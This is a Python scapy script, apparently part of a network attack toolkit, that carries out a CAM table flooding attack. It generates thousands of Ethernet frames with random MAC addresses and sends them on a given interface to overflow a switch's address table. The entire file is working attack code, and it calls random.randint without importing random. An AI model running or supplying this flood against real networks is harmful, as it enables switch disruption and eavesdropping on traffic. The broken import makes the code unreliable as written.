from scapy.all import Ether, IP, RandIP, RandMAC, sendp
import argparse

def execute(args):
    """Execute CAM flooding attack"""
    print(f"[CAM Flood] Starting attack on interface {args.interface}")
    
    count = args.count if args.count else 10000
    
    packet_list = generate_packets(count)
    
    try:
        sendp(packet_list, iface=args.interface, verbose=args.verbose)
        print(f"[CAM Flood] Sent {count} packets to flood CAM table")
        return True
    except Exception as e:
        print(f"[CAM Flood] Error: {e}")
        return False

def generate_packets(count=10000):
    """Generate random Ethernet packets for CAM flooding"""
    packet_list = []
    
    for i in range(count):
        src_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 254)}"
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=src_ip, dst=RandIP())
        packet_list.append(packet)
    
    return packet_list

def add_arguments(parser):
    """Add CAM flood-specific arguments to parser"""
    parser.add_argument("--count", "-c", type=int, default=10000, 
                       help="Number of packets to send (default: 10000)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CAM Table Flooding Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--count", "-c", type=int, default=10000, 
                       help="Number of packets to send")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)